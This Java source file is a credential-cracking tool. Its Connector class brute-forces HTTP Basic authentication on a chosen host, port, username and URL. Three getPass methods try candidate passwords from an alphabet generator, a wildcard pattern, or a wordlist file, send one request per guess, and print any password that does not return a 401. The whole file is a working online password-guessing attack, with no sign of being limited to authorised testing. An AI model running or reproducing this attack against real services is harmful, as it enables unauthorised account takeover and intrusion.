package org.axiom.streamTest;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.IOException;
import java.nio.file.Path;
import java.util.*;
import java.util.function.Supplier;


public class Connector {
    private final String alphabet;
    private final String host;
    private final String username;
    private final String fullURL;
    private final int port;

    public Connector(String alphabet, String host, String username, String fullURL, int port) {
        this.alphabet = alphabet;
        this.host = host;
        this.username = username;
        this.fullURL = fullURL;
        this.port = port;
    }


    public void getPass(String pattern)  throws IOException {
        //  first == String with all non-alphabet characters replaced by one non-alphabet character
        //  second == this specific non-alphabet character
        Pair<String, Character> pair = preparePattern(pattern);

        pattern = pair.getKey();

        int genLen = (int)pattern.chars().filter(in -> in == pair.getValue()).count();
        //  pattern = pattern.replaceAll("(.)\\1+", "$1");

        Supplier<String> passwordSupplier = new PassGenerator(alphabet, genLen);

        DefaultHttpClient httpClient = new DefaultHttpClient();
int a = 0;
        //  for(String password = insert(pattern, passwordSupplier.get(), pair.getValue()) ; password.length() <= maxPassLen ; password = insert(pattern, passwordSupplier.get(), pair.getValue())) {
        for(String string = passwordSupplier.get(); string.length() == genLen ; string = passwordSupplier.get()) {
            String password = insert(pattern, string, pair.getValue());

            httpClient.getCredentialsProvider().setCredentials(
                    new AuthScope(host, port),
                    new UsernamePasswordCredentials(username, password)
            );

            HttpGet httpGet = new HttpGet(fullURL);
            HttpResponse response = httpClient.execute(httpGet);
            HttpEntity entity = response.getEntity();

++a;
            if(response.getStatusLine().getStatusCode() != 401) {
                System.out.println("Password found(" + a + ")");
                System.out.println("Pass: " + password);
                return;
            }

            entity.consumeContent();
        }

        System.out.println("Password not found(" + a + ")");
    }


    private String insert(String where, String what, char ch) {
        StringBuilder result = new StringBuilder();

        for(int i=0 , j=0 ; i<where.length() ; ++i)
            if(where.charAt(i) == ch)
                result.append(what.charAt(j++));
            else
                result.append(where.charAt(i));

         return result.toString();
    }


    private Pair<String, Character> preparePattern(String pattern) {
        char[] temp = alphabet.toCharArray();
        Arrays.sort(temp);

        char max = (char)(temp[temp.length - 1] + (char)1);

        HashSet<Character> allowedSymbols = new HashSet<>();
        for(int i=0 ; i<alphabet.length() ; ++i)
            allowedSymbols.add(alphabet.charAt(i));

        char[] result = new char[pattern.length()];

        for(int i=0 ; i<pattern.length() ; ++i)
            if(allowedSymbols.contains(pattern.charAt(i)))
                result[i] = pattern.charAt(i);
            else
                result[i] = max;

        return new Pair<String, Character>(new String(result), max);
    }


    public void getPass(int maxPassLen) throws IOException {
        Supplier<String> passwordSupplier = new PassGenerator(alphabet);

        DefaultHttpClient httpClient = new DefaultHttpClient();

        int a = 0;

        for(String password = passwordSupplier.get() ; password.length() <= maxPassLen ; password = passwordSupplier.get()) {
            httpClient.getCredentialsProvider().setCredentials(
                    new AuthScope(host, port),
                    new UsernamePasswordCredentials(username, password)
            );

            HttpGet httpGet = new HttpGet(fullURL);
            HttpResponse response = httpClient.execute(httpGet);
            HttpEntity entity = response.getEntity();

            a++;

            if(response.getStatusLine().getStatusCode() != 401) {
                System.out.println("Password found(" + a + ")");
                System.out.println("Pass: " + password);
                return;
            }

            entity.consumeContent();
        }

        System.out.println("Password not found(" + a + ")");

        // When HttpClient instance is no longer needed,
        // shut down the connection manager to ensure
        // immediate deallocation of all system resources
        httpClient.getConnectionManager().shutdown();
    }


    public void getPass(Path path, int maxPassLen) throws IOException {
        PassReader reader = new PassReader(path);

        DefaultHttpClient httpClient = new DefaultHttpClient();

        int a = 0;

        for(String password = reader.get() ; password.length() <= maxPassLen ; password = reader.get()) {
            httpClient.getCredentialsProvider().setCredentials(
                    new AuthScope(host, port),
                    new UsernamePasswordCredentials(username, password)
            );

            HttpGet httpGet = new HttpGet(fullURL);
            HttpResponse response = httpClient.execute(httpGet);
            HttpEntity entity = response.getEntity();

            a++;

            if(response.getStatusLine().getStatusCode() != 401) {
                System.out.println("Password found(" + a + ")");
                System.out.println("Pass: " + password);
                return;
            }

            entity.consumeContent();
        }

        System.out.println("Password not found(" + a + ")");

        // When HttpClient instance is no longer needed,
        // shut down the connection manager to ensure
        // immediate deallocation of all system resources
        httpClient.getConnectionManager().shutdown();

    }
}
